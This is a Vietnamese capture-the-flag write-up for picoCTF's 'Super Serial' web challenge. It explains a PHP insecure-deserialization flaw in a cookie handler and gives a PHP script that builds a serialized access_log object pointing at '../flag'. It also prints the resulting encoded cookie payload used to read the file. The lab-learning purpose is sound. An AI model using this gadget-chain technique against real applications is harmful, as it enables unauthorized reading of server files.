# Super Serial

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image328.png?raw=true)

Truy cập trang web:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image329.png?raw=true)

Tôi đã thử chèn các payload để bypass login nhưng không được, tiếp theo tôi thử truy cập `robots.txt`:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image330.png?raw=true)

Tôi tìm được path `/admin.phps`. Thử truy cập:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image331.png?raw=true)

Tôi để ý là tại sao lại là `.phps`, thử truy cập `index.phps`:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image332.png?raw=true)

Có thể truy cập, tôi tìm thêm được đoạn mã PHP:

    <?php
    require_once("cookie.php");

    if(isset($_POST["user"]) && isset($_POST["pass"])){
        $con = new SQLite3("../users.db");
        $username = $_POST["user"];
        $password = $_POST["pass"];
        $perm_res = new permissions($username, $password);
        if ($perm_res->is_guest() || $perm_res->is_admin()) {
            setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
            header("Location: authentication.php");
            die();
        } else {
            $msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
        }
    }
    ?>

Tôi tiếp tục phát hiện ra 2 file `cookie.php` và `authentication.php`. Tôi thử truy cập cả 2 file, chỉ có thể truy cập `authentication.php`, còn `cookie.php` khi truy cập sẽ không hiển thị gì. 

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image335.png?raw=true)

Đồng thời, có thể truy cập `cookie.phps` và `authentication.phps`:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image333.png?raw=true)

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image334.png?raw=true)

Lỗ hổng đầu tiên tôi tìm kiếm được là ở `cookie.phps`:

    if(isset($_COOKIE["login"])){
        try{
            $perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
            $g = $perm->is_guest();
            $a = $perm->is_admin();
        }
        catch(Error $e){
            die("Deserialization error. ".$perm);
        }
    }

Đoạn mã này có lỗ hổng `deserialization` (giải tuần tự hóa):
- Server kiểm tra nếu có cookie `login` được gửi lên từ trình duyệt.
- Nếu có, server sẽ:
    - `URL-decode` nội dung cookie
    - `Base64-decode`
    - `unserialize()` để biến nó thành một đối tượng PHP (dạng gốc ban đầu là một object permissions)
- Sau đó, server sẽ gọi các hàm `$perm->is_guest()` và `$perm->is_admin()` để kiểm tra quyền.

Điểm yếu tồn tại ở đây là:
- Nếu có lỗi khi deserialize, chương trình sẽ rơi vào `catch`:

        catch(Error $e){
        die("Deserialization error. ".$perm);
        }

- Ở đây, `$perm` là object, nhưng được ép thành chuỗi (string) khi in ra => PHP sẽ tự gọi hàm `__toString()` của object:

        function __toString() {
        return $u.$p;
        }

Lỗ hổng tiếp theo tồn tại trong `authentication.phps`:

    class access_log {
        public $log_file;

        function __construct($lf) {
            $this->log_file = $lf;
        }

        function __toString() {
            return $this->read_log();
        }

        function append_to_log($data) {
            file_put_contents($this->log_file, $data, FILE_APPEND);
        }

        function read_log() {
            return file_get_contents($this->log_file);
        }
    }

Vai trò của từng hàm:

- `$log_file`: tên file để ghi/đọc log
- `append_to_log()`: ghi log vào file
- `read_log()`: đọc nội dung file log
- `__toString()`: khi object bị ép thành chuỗi, PHP sẽ gọi read_log() => đọc nội dung file và trả về

Mối liên hệ giữa `authentication.phps` và `cookie.phps`:

Trong file `cookie.phps`, nếu có cookie `login`, server sẽ thực hiện:

    $perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));

=> Đây là điểm yếu quan trọng: attacker có thể gửi một `object serialize giả mạo` trong cookie, không cần phải là permissions, mà có thể là object bất kỳ – ví dụ: access_log.

Dựa vào hint từ thử thách, flag nằm ở `../flag`. Ý tưởng của tôi là tạo object `access.log` với `$log_file = "../flag"`, nghĩa là tôi sẽ đọc file `../flag` thay vì file `access.log`. 

Tiếp theo tôi sẽ serialize object `access_log` đó, sau đó `base64` + `urlencode` => gửi lên làm cookie `login`.

Khi server deserialize object này:
- Nó không có method `is_guest()` nên sẽ gây ra lỗi
- Rơi vào `catch`, nội dung `../flag` sẽ được in ra màn hình

Để lấy giá trị `serialize + base64 + urlencode` của object `access_log`, tôi thực hiện đoạn code sau:

    <?php

    class access_log
    {
        public $log_file;

        function __construct($lf) {
            $this->log_file = $lf;
        }

        function __toString() {
            return $this->read_log();
        }

        function append_to_log($data) {
            file_put_contents($this->log_file, $data, FILE_APPEND);
        }

        function read_log() {
            return file_get_contents($this->log_file);
        }
    }
    echo urlencode(base64_encode(serialize(new access_log("../flag"))));
    ?>

Thực thi đoạn code, tôi thu được giá trị: `TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9`

Tiếp theo, trên trang `application.php`, tôi sẽ thêm cookie `login` với giá trị là  `TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9`:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image336.png?raw=true)

=> Tìm được flag


